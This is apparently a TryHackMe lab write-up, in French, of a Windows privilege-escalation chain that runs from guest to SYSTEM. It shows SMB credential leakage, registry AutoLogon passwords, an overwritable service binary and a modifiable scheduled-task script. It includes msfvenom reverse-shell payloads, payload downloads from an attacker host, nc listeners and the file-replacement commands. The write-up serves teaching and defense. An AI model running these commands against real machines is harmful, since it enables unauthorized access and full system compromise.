---
type: writeup
category:
  - privilege-escalation
  - windows
  - credential-access
  - service-hijacking
  - scheduled-task
technology:
  - Windows
  - SMB
  - RDP
  - PowerShell
  - NetExec
  - smbclient
  - msfvenom
  - Netcat
source: TryHackMe
scope: authorized-testing-only
last_verified: 2026-09-14
---
# 1. Reconnaissance


```bash
nmap -sC -sV <TARGET_IP>
+
Scan de tous les ports :
nmap -p- --min-rate 5000 -Pn <TARGET_IP>
```

Services intéressants :

| Port | Service | Intérêt |
|---|---|---|
| `445` | SMB | Shares / credentials |
| `3389` | RDP | Interactive Windows access |
| `5985` | WinRM | Remote PowerShell possible |



# 2. guest → thmuser — Credentials dans un partage SMB

## Enumérer les shares

```bash
smbclient -L //<TARGET_IP> -N

`-L` signifie : lister les partages SMB disponibles
`-N` signifie : do not ask for a password
```

Résultat intéressant :

```text
Public    Disk    Public file share
```

Tester réellement l'accès :

```bash
smbclient //<TARGET_IP>/Public -N
```

Puis :

```text
ls
get welcome.txt
exit
cat welcome.txt
> Username : thmuser
> Password : Password1!
```

### Enumération supplémentaire


```bash
netexec smb <TARGET_IP> -u guest -p '' --rid-brute

`NetExec` est un outil d’énumération et d’administration offensive pour réseaux Windows, notamment SMB, WinRM, LDAP, MSSQL, etc.
```

Comptes intéressants :

```text
thmuser
notadmin
svcadmin
```

## Connexion RDP

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore \
/v:<TARGET_IP> /u:thmuser /p:'Password1!'


xfreerdp
→ client RDP en ligne de commande

/dynamic-resolution
→ adapte automatiquement la résolution de la session RDP
   quand tu redimensionnes la fenêtre

+clipboard
→ active le partage du presse-papiers
   entre l’AttackBox et Windows

/cert:ignore
→ ignore les erreurs de certificat RDP

```

Vérification :

```powershell
whoami
> privesc\thmuser

> Get-Content C:\Users\thmuser\Desktop\flag1.txt
```

### Point important

WinRemoteManagement était exposé sur `5985`, mais `thmuser` n'était pas autorisé à ouvrir une session WinRM.

```text
open WinRM port
!=
user authorized for WinRM
```



# 3. thmuser → notadmin — Winlogon AutoLogon credentials

L'énumération de base ne révèle rien d'intéressant :

```powershell
whoami /groups
whoami /priv
cmdkey /list
```

Le registre Winlogon est ensuite inspecté :

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

Résultat :

```text
DefaultUserName = notadmin
DefaultPassword = P@ssw0rd!
```

C'est une configuration AutoLogon dangereuse :

```text
plaintext credential
stored in registry
→ credential disclosure
```

## Changer de contexte utilisateur

```powershell
runas /user:PRIVESC\notadmin powershell.exe
```

Alternative pour un compte local :

```powershell
runas /user:.\notadmin powershell.exe
```

Entrer :

```text
P@ssw0rd!
```

Dans la nouvelle fenêtre :

```powershell
whoami
```

Résultat :

```text
privesc\notadmin
```

Deuxième flag :

```powershell
Get-Content C:\Users\notadmin\Desktop\flag2.txt
```




# 4. notadmin → svcadmin — Weak Service Executable Permissions

Chercher les services utilisant `svcadmin` :

```powershell
Get-CimInstance Win32_Service |
Where-Object {$_.StartName -match "svcadmin"} |
Select-Object Name,StartName,PathName,State
```

Résultat :

```text
Name      : THMSvc
StartName : .\svcadmin
PathName  : C:\Windows\THMSVC\svc.exe
State     : Stopped
```

Inspecter le service :

```powershell
sc.exe qc THMSvc
```

Informations critiques :

```text
BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
SERVICE_START_NAME : .\svcadmin
```

Vérifier les ACL :

```powershell
icacls C:\Windows\THMSVC
icacls C:\Windows\THMSVC\svc.exe
```

Finding :

```text
C:\Windows\THMSVC
→ notadmin:(F)

svc.exe
→ Everyone:(F)
```

```text
(F) = Full Control
```

Donc :

```text
notadmin can replace svc.exe
+
THMSvc executes svc.exe as svcadmin
=
code execution as svcadmin
```

## Générer un payload compatible service

AttackBox :

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=4444 \
-f exe-service -o svc.exe
```

`exe-service` est préférable à `exe` car le binaire doit être lancé par le Windows Service Control Manager.

Servir le fichier :

```bash
python3 -m http.server 8000
```

Listener :

```bash
nc -lvnp 4444
```

## Remplacer le binaire

Sauvegarder l'original :

```powershell
Copy-Item C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
```

Télécharger le nouveau :

```powershell
Invoke-WebRequest \
http://<ATTACKER_IP>:8000/svc.exe \
-OutFile C:\Windows\THMSVC\svc.exe
```

Démarrer le service :

```powershell
sc.exe start THMSvc
```

Dans le listener :

```cmd
whoami
```

Résultat :

```text
privesc\svcadmin
```

Troisième flag :

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

### Observation du lab

Un payload généré avec :

```text
-f exe
```

a également réussi à produire un callback, mais `sc.exe` a retourné :

```text
Error 1053
The service did not respond to the start or control request in a timely fashion.
```

Le callback ne signifie donc pas que le programme est un service Windows correctement implémenté.

Pour remplacer un service :

```text
prefer exe-service
```




# 5. svcadmin → SYSTEM — Writable Scheduled Task Script

Depuis le shell `svcadmin` :

```cmd
type C:\Windows\Tasks\Cleanup.bat
```

Contenu initial :

```batch
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

Vérifier les permissions :

```cmd
icacls C:\Windows\Tasks\Cleanup.bat
```

Finding important :

```text
PRIVESC\svcadmin:(I)(M)
NT AUTHORITY\SYSTEM:(I)(F)
```

```text
(M) = Modify
(I) = inherited permission
```

Le script est exécuté périodiquement dans un contexte privilégié.

Mental model :

```text
privileged Scheduled Task
        ↓
executes Cleanup.bat
        +
svcadmin can modify Cleanup.bat
        ↓
attacker-controlled code
executes as privileged account
```

## Générer le payload final

AttackBox :

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=5555 \
-f exe -o shell.exe
```

Ici `exe` est suffisant car `shell.exe` sera lancé comme programme normal depuis un batch, et non directement comme service Windows.

Listener :

```bash
nc -lvnp 5555
```

## Télécharger le payload

Depuis le shell `svcadmin` :

```cmd
powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/shell.exe' -OutFile 'C:\Windows\Tasks\shell.exe'"
```

Vérifier :

```cmd
dir C:\Windows\Tasks\shell.exe
```

Sauvegarder éventuellement le batch :

```cmd
copy C:\Windows\Tasks\Cleanup.bat C:\Windows\Tasks\Cleanup.bat.bak
```

Puis remplacer son contenu :

```cmd
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\Cleanup.bat
```

Vérifier :

```cmd
type C:\Windows\Tasks\Cleanup.bat
```

Attendre l'exécution de la tâche.

Le listener reçoit alors :

```cmd
whoami
```

```text
nt authority\system
```

Dernier flag :

```cmd
type C:\flag4.txt
```

---

# 6. Chemin d'attaque final

| Étape | Faiblesse | Résultat |
|---|---|---|
| `guest → thmuser` | credentials dans un share SMB lisible par Guest | compte `thmuser` |
| `thmuser → notadmin` | AutoLogon credentials dans Winlogon | compte `notadmin` |
| `notadmin → svcadmin` | service executable modifiable | shell `svcadmin` |
| `svcadmin → SYSTEM` | batch modifiable exécuté par une tâche privilégiée | `NT AUTHORITY\SYSTEM` |

Le point commun est toujours :

```text
privileged trust / execution
+
lower-privileged control
=
escalation path
```



# 7. MITRE ATT&CK

| Technique | Application dans la room |
|---|---|
| `T1552.001 — Credentials In Files` | `welcome.txt` dans le share SMB |
| `T1552.002 — Credentials in Registry` | Winlogon `DefaultPassword` |
| `T1569.002 — Service Execution` | exécution du payload via `THMSvc` |
| `T1053.005 — Scheduled Task` | exécution privilégiée de `Cleanup.bat` |

---

# À retenir

Windows Jump ne repose sur aucun exploit complexe.

La compromission complète vient d'une chaîne de mauvaises configurations :

```text
credential exposure
→ credential reuse
→ weak service file permissions
→ privileged scheduled execution
```

La méthode générale à retenir est :

```text
Enumerate identity
    ↓
Find privileged identities/components
    ↓
Determine what they execute or trust
    ↓
Check whether current user controls it
    ↓
Exploit the trust boundary
    ↓
whoami
    ↓
Re-enumerate
```

Le réflexe essentiel en privilege escalation Windows est donc :

```text
Who executes this?
+
What can I modify?
```